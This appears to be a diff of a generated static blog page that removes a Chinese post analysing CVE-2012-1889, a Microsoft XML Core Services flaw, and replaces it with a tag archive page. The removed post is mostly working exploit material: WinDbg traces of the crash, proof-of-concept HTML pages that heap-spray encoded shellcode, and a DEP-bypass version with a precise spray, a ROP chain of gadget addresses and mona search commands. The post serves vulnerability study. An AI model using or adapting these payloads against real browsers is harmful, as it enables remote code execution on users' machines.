@@ -6,23 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://blog.jbyusk.com">
-  <title>暴雷漏洞分析 | 想与做</title>
+  <title>Tag: 网络协议 | 想与做</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="环境 DEP ASLR     WinXP sp3 Ie6 否 否   WinXP sp3 Ie8 是 否   Win7 32b Ie8 是 是     初步分析  CVE-2012-1889暴雷漏洞是Microsoft XML CoreServices 3.0~6.0版本中存在漏洞，该漏洞源于访问未初始化内存的位置。远程攻击者可借助特制的web站点利用该漏洞执行任意代码或导致拒绝服务。12">
-<meta name="keywords" content="漏洞分析">
-<meta property="og:type" content="article">
-<meta property="og:title" content="暴雷漏洞分析">
-<meta property="og:url" content="http://blog.jbyusk.com/2018/10/24/暴雷漏洞分析/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="想与做">
+<meta property="og:url" content="http://blog.jbyusk.com/tags/网络协议/index.html">
 <meta property="og:site_name" content="想与做">
-<meta property="og:description" content="环境 DEP ASLR     WinXP sp3 Ie6 否 否   WinXP sp3 Ie8 是 否   Win7 32b Ie8 是 是     初步分析  CVE-2012-1889暴雷漏洞是Microsoft XML CoreServices 3.0~6.0版本中存在漏洞，该漏洞源于访问未初始化内存的位置。远程攻击者可借助特制的web站点利用该漏洞执行任意代码或导致拒绝服务。12">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_1.png">
-<meta property="og:image" content="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_2.png">
-<meta property="og:updated_time" content="2018-10-25T13:07:33.295Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="暴雷漏洞分析">
-<meta name="twitter:description" content="环境 DEP ASLR     WinXP sp3 Ie6 否 否   WinXP sp3 Ie8 是 否   Win7 32b Ie8 是 是     初步分析  CVE-2012-1889暴雷漏洞是Microsoft XML CoreServices 3.0~6.0版本中存在漏洞，该漏洞源于访问未初始化内存的位置。远程攻击者可借助特制的web站点利用该漏洞执行任意代码或导致拒绝服务。12">
-<meta name="twitter:image" content="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_1.png">
+<meta name="twitter:title" content="想与做">
   
     <link rel="alternative" href="/atom.xml" title="想与做" type="application/atom+xml">
   
@@ -164,219 +156,59 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-暴雷漏洞分析" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 class="article-title" itemprop="name">
-      暴雷漏洞分析
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/11/20/网络协议学习第一天/" class="archive-article-date">
+  	<time datetime="2018-11-20T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-20</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/11/20/网络协议学习第一天/">网络协议学习第一天</a>
     </h1>
   
 
-		
-		<span class="archive-article-date">
-			阅读量 <span id="busuanzi_value_page_pv"></span>
-		</span>
-	    
-        
-        <a href="/2018/10/24/暴雷漏洞分析/" class="archive-article-date">
-  	<time datetime="2018-10-24T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-24</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <table>
-<thead>
-<tr>
-<th style="text-align:left">环境</th>
-<th style="text-align:center">DEP</th>
-<th style="text-align:right">ASLR</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">WinXP sp3 Ie6</td>
-<td style="text-align:center">否</td>
-<td style="text-align:right">否</td>
-</tr>
-<tr>
-<td style="text-align:left">WinXP sp3 Ie8</td>
-<td style="text-align:center">是</td>
-<td style="text-align:right">否</td>
-</tr>
-<tr>
-<td style="text-align:left">Win7 32b Ie8</td>
-<td style="text-align:center">是</td>
-<td style="text-align:right">是</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p>初步分析</p>
-</blockquote>
-<p>CVE-2012-1889暴雷漏洞是Microsoft XML CoreServices 3.0~6.0版本中存在漏洞，该漏洞源于访问未初始化内存的位置。远程攻击者可借助特制的web站点利用该漏洞执行任意代码或导致拒绝服务。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#html代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CVE 2012-1889 PoC v1 By:15PB&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt; &lt;/object&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&apos;15PB&apos;).object.definition(0);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#windgb异常中断点</span><br><span class="line">5dd8d74b 0f8cc7000000    jl      msxml3!DllUnregisterServer+0xa94 (5dd8d818)</span><br><span class="line">5dd8d751 8b45ec          mov     eax,dword ptr [ebp-14h] ;1.eax= [ebp-14h]</span><br><span class="line">5dd8d754 3bc3            cmp     eax,ebx</span><br><span class="line">5dd8d756 8bf0            mov     esi,eax</span><br><span class="line">5dd8d758 7426            je      msxml3!DllUnregisterServer+0x9fc (5dd8d780)</span><br><span class="line">5dd8d75a ff7528          push    dword ptr [ebp+28h]</span><br><span class="line">5dd8d75d 8b08            mov     ecx,dword ptr [eax] ;2.ecx = [eax]</span><br><span class="line">5dd8d75f ff7524          push    dword ptr [ebp+24h]</span><br><span class="line">5dd8d762 ff7520          push    dword ptr [ebp+20h]</span><br><span class="line">5dd8d765 57              push    edi</span><br><span class="line">5dd8d766 6a03            push    3</span><br><span class="line">5dd8d768 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">5dd8d76b 68f8a7d85d      push    offset msxml3!DllGetClassObject+0x16fde (5dd8a7f8)</span><br><span class="line">5dd8d770 53              push    ebx</span><br><span class="line">5dd8d771 50              push    eax</span><br><span class="line">5dd8d772 ff5118          call    dword ptr [ecx+18h]  ;3.call [ecx+18h]漏洞点</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>Windows xp sp3 ie6</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#POC代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">            // 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">                // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">                // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; 0x1000)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">                // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">5dd8d751 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">5dd8d754 3bc3            cmp     eax,ebx</span><br><span class="line">5dd8d756 8bf0            mov     esi,eax</span><br><span class="line">5dd8d758 7426            je      msxml3!DllUnregisterServer+0x9fc (5dd8d780)</span><br><span class="line">5dd8d75a ff7528          push    dword ptr [ebp+28h]</span><br><span class="line">5dd8d75d 8b08            mov     ecx,dword ptr [eax]  ds:0023:0c0c0c0c=????????</span><br><span class="line">5dd8d75f ff7524          push    dword ptr [ebp+24h]</span><br><span class="line">5dd8d762 ff7520          push    dword ptr [ebp+20h]</span><br><span class="line">5dd8d765 57              push    edi</span><br><span class="line">5dd8d766 6a03            push    3</span><br><span class="line">5dd8d768 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">5dd8d76b 68f8a7d85d      push    offset msxml3!DllGetClassObject+0x16fde (5dd8a7f8)</span><br><span class="line">5dd8d770 53              push    ebx</span><br><span class="line">5dd8d771 50              push    eax</span><br><span class="line">5dd8d772 ff5118          call    dword ptr [ecx+18h]</span><br><span class="line"></span><br><span class="line">eax指向0x0c0c0c0c,如果使用堆喷射的技术,使0x0c0c0c0c地址的内容也为0x0c0c0c0c,</span><br><span class="line">则最后会call [0x0c0c0c0c + 18h] = [0x0c0c0c24h]</span><br><span class="line">如果0x0c0c0c24h内容也会0x0c0c0c0c,会call 0x0c0c0c0c0c.</span><br><span class="line">而0c0c汇编成指令为(or al,C),在shellcode执行前的寄存器的改变等于NOP,所以可以采用堆喷射技术实现任意代码执行</span><br></pre></td></tr></table></figure>
-<ul>
-<li>堆喷射<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">为了能覆盖0x0c0c0c0c,需要申请200M的内存空间。</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">		//1.准备shellcode</span><br><span class="line">		var cShellcode = unescape(</span><br><span class="line">		&quot;\uC033\uFFE8\uFFFF\uC3FF\u8D58\u1B70\uC933\uB966\u0186\u048A\u340E\u8817\u0E04\uF6E2\u3480\u170E\uE6FF\u9477\u77FB\u26FC\u727C\u7965\u7B72\u2524\u7339\u7B7B\u7217\u96A7\u4218\u7264\u2465\u3925\u7B73\u177B\u6703\uC32B\uB405\uD188\u725F\u7B7B\u3778\u6540\u7B78\u3673\uFF17\u1717\u1717\u734C\u229C\u1727\u1717\u619C\u9C1B\u0B61\u219C\u419C\u441F\u5C9A\u46C0\uFF45\u177C\u1717\u7D47\u7D17\u9A17\uDD5C\uE846\u9CC7\u4FC7\u444C\u4547\uD3FF\u1717\u4217\uFB9C\uFB94\uD013\uEB52\u1717\u1717\u4145\u4440\u9C46\u1F62\uDE24\uD724\u139D\u9319\u63D7\u9C0F\uEB4A\uCF14\uF4D6\u9C0E\uEB42\uC714\uFDD6\u1C10\u9ECD\uEB4A\uFC56\u9CF6\uEB4A\u429C\u241B\u2CD7\u62CD\uAF12\u1716\u1717\u494E\u4C48\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u451B\u9C44\u1F42\u659C\u9A2B\u2523\u619C\u9A6F\u2523\u699C\u9A0B\u2D2B\u6A9E\u9CEB\u3769\u2B9A\u9E2D\uEF6A\u699C\u9A33\u2D2B\u6A9E\u24E3\uFCDE\u5616\u629C\u9CEF\u9923\u429C\u9A1F\u0123\u6A9C\u9C1B\u4028\uFF41\uE84A\uE8E8\uD792\uF463\u629C\u24E3\u71E8\u2B9C\u9C59\uEB62\u239C\u9CA9\u1F42\u139A\u4C01\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u9C1F\u074A\u5C9A\u7DCC\u7D17\u4617\u42E8\u9C1B\u074A\u5C9A\u46F1\uFF47\uE878\uE8E8\u4A9C\u9E07\uEB52\u5C9A\u46FD\u5A9C\u461F\u4BFF\uE8E8\u9EE8\uEF52\uC524\u9C45\u074A\u5C9A\u46F9\u4546\u42E8\u7DEB\uE817\uEF42\uF29C\uD54A\u171B&quot;)</span><br><span class="line">		//2.制造滑块数据</span><br><span class="line">		//2.1计算填充滑块指令数据大小</span><br><span class="line">		var nSlideSize = 1024*1024 / 2; // 一个滑板指令区的大小（1MB）</span><br><span class="line">	    var nMlcHadSize = 32 / 2; // 堆头部大小</span><br><span class="line">	    var nStrLenSize = 4 / 2; // 堆长度信息大小</span><br><span class="line">	    var nTerminatorSize = 2 / 2; // 堆结尾符号大小</span><br><span class="line">	    var nScSize = cShellcode.length; // Shellcode大小</span><br><span class="line">	    var nFillSize = nSlideSize-nMlcHadSize-nStrLenSize-nScSize-nTerminatorSize;</span><br><span class="line">		//2.2填充滑块指令</span><br><span class="line">		var cFillData = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		var cSlideData = new Array(); //申请数组对象保存滑板数据</span><br><span class="line">		while(cFillData.length &lt; nSlideSize)</span><br><span class="line">			cFillData+= cFillData;</span><br><span class="line">		for(var i=0;i&lt;200;i++)&#123;</span><br><span class="line">			cFillData = cFillData.substring(0,nFillSize);</span><br><span class="line">			cSlideData[i] = cFillData + cShellcode;</span><br><span class="line">		&#125;</span><br><span class="line">        // 4.触发CVE 2012-1889漏洞</span><br><span class="line">		// 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">        // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">        // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; nSlideSize)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">        // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_1.png" alt=""></p>
-<blockquote>
-<p>Windows xp sp3 ie8</p>
-</blockquote>
-<p>由于ie8有了DEP保护,所以没有执行payload,而是直接出现异常中断<br><img src="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_2.png" alt=""></p>
-<ul>
-<li>精准Heap Spray<br>要绕过DEP需要使用Ret2Libc技术,依赖于栈,所以需要使用xchg命令使esp指向堆的地址<br>但是原本的Heap Spray执行的位置是不确定的,所以需要使用精准Heap Spray使call dword ptr [ecx+18h]刚好执行xchg</li>
-</ul>
-<p>内存的分机是以一个分页为单位的，大多数的X86系统中，分页为4KB，= 0x1000字节<br>计算这个地址与当前分页页首的相对偏移：<br>相对偏移= （目标地址-UserPtr地址）% 0x1000 / 2;<br>在windbg使用!heap -p -a 0x0c0c0c0c获取UserPtr地址为0c070020，则偏移为5F6<br>其中精准喷射，每块的数据大小是0x1000,但是需要对字符进行选取,用到块大小的计算:<br>cBlock = cBlock.substring(2,nBlockSize-0x21);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">!py mona find -s &quot;\x87\xCC\xC3&quot; // xchg ecx,esp;ret;</span><br><span class="line">!py mona find -s &quot;\x5B\xC3&quot; // pop ebx; ret;</span><br><span class="line">!py mona find -s &quot;\xC3&quot; //查找ret;</span><br><span class="line">u VirtualProtect //查找VirtualProtect地址</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">		//1.生成相对偏移前的padding</span><br><span class="line">		var cPadding = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		while(cPadding.length &lt; 0x1000)</span><br><span class="line">			cPadding += cPadding;</span><br><span class="line">		cPadding = cPadding.substring(0,0x5F6);</span><br><span class="line">		//2.制作RetLibc目前设置是为了查找真实跳转</span><br><span class="line">		//7C96D0FB(87 CC c3 xchg esp,ecx;ret;) 77be637d(C3 ret;) 0x77bf1d16(58 c3 pop ebx;ret;) 7c801ad4 VirtualProtect</span><br><span class="line">		var cRet2Libc = unescape(</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u1d16\u77bf&quot; +</span><br><span class="line">		&quot;\uD0FB\u7C96&quot; +</span><br><span class="line">		&quot;\u1ad4\u7c80&quot; +</span><br><span class="line">		&quot;\u0C40\u0C0C&quot; +</span><br><span class="line">		&quot;\u0C40\u0C0C&quot; +</span><br><span class="line">		&quot;\u1000\u0000&quot; +</span><br><span class="line">		&quot;\u0040\u0000&quot; +  </span><br><span class="line">		&quot;\uf123\u77C2&quot;);</span><br><span class="line">		//3.准备shellcode</span><br><span class="line">		var cShellcode = unescape(</span><br><span class="line">		&quot;\uC033\uFFE8\uFFFF\uC3FF\u8D58\u1B70\uC933\uB966\u0186\u048A\u340E\u8817\u0E04\uF6E2\u3480\u170E\uE6FF\u9477\u77FB\u26FC\u727C\u7965\u7B72\u2524\u7339\u7B7B\u7217\u96A7\u4218\u7264\u2465\u3925\u7B73\u177B\u6703\uC32B\uB405\uD188\u725F\u7B7B\u3778\u6540\u7B78\u3673\uFF17\u1717\u1717\u734C\u229C\u1727\u1717\u619C\u9C1B\u0B61\u219C\u419C\u441F\u5C9A\u46C0\uFF45\u177C\u1717\u7D47\u7D17\u9A17\uDD5C\uE846\u9CC7\u4FC7\u444C\u4547\uD3FF\u1717\u4217\uFB9C\uFB94\uD013\uEB52\u1717\u1717\u4145\u4440\u9C46\u1F62\uDE24\uD724\u139D\u9319\u63D7\u9C0F\uEB4A\uCF14\uF4D6\u9C0E\uEB42\uC714\uFDD6\u1C10\u9ECD\uEB4A\uFC56\u9CF6\uEB4A\u429C\u241B\u2CD7\u62CD\uAF12\u1716\u1717\u494E\u4C48\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u451B\u9C44\u1F42\u659C\u9A2B\u2523\u619C\u9A6F\u2523\u699C\u9A0B\u2D2B\u6A9E\u9CEB\u3769\u2B9A\u9E2D\uEF6A\u699C\u9A33\u2D2B\u6A9E\u24E3\uFCDE\u5616\u629C\u9CEF\u9923\u429C\u9A1F\u0123\u6A9C\u9C1B\u4028\uFF41\uE84A\uE8E8\uD792\uF463\u629C\u24E3\u71E8\u2B9C\u9C59\uEB62\u239C\u9CA9\u1F42\u139A\u4C01\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u9C1F\u074A\u5C9A\u7DCC\u7D17\u4617\u42E8\u9C1B\u074A\u5C9A\u46F1\uFF47\uE878\uE8E8\u4A9C\u9E07\uEB52\u5C9A\u46FD\u5A9C\u461F\u4BFF\uE8E8\u9EE8\uEF52\uC524\u9C45\u074A\u5C9A\u46F9\u4546\u42E8\u7DEB\uE817\uEF42\uF29C\uD54A\u171B&quot;)</span><br><span class="line">		//4.制造滑块数据</span><br><span class="line">		//4.1计算填充滑块指令数据大小</span><br><span class="line">		var nSlideSize = 0x1000; // 一个滑板指令区的大小（4kb）</span><br><span class="line">	    var nPadSize = cPadding.length; // padding</span><br><span class="line">	    var nR2LSize = cRet2Libc.length; // cRet2Libc大小</span><br><span class="line">	    var nScSize = cShellcode.length; // Shellcode大小</span><br><span class="line">	    var nFillSize = nSlideSize-nPadSize-nR2LSize-nScSize;</span><br><span class="line">		//4.2填充滑块指令</span><br><span class="line">		var cFillData = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		while(cFillData.length &lt; nSlideSize)</span><br><span class="line">			cFillData+= cFillData;</span><br><span class="line">		cFillData = cFillData.substring(0,nFillSize);</span><br><span class="line">		//5.构造滑板指令数据块</span><br><span class="line">		var nBlockSize = 0x40000; //256kb</span><br><span class="line">		var cBlock = cPadding + cRet2Libc + cShellcode + cFillData;</span><br><span class="line">		while(cBlock.length &lt; nBlockSize)</span><br><span class="line">			cBlock += cBlock;</span><br><span class="line">		cBlock = cBlock.substring(2,nBlockSize-0x21);</span><br><span class="line">		//6.填充200M内存空间,申请800块大小的滑板数据区</span><br><span class="line">		var cSlideData = new Array()</span><br><span class="line">		for(var i=0;i&lt;800;i++)&#123;</span><br><span class="line">			cSlideData[i] = cBlock.substr(0,cBlock.length);</span><br><span class="line">		&#125;</span><br><span class="line">        // 4.触发CVE 2012-1889漏洞</span><br><span class="line">		// 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">        // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C08&quot;);</span><br><span class="line">        // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; nSlideSize)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">        // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络协议</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
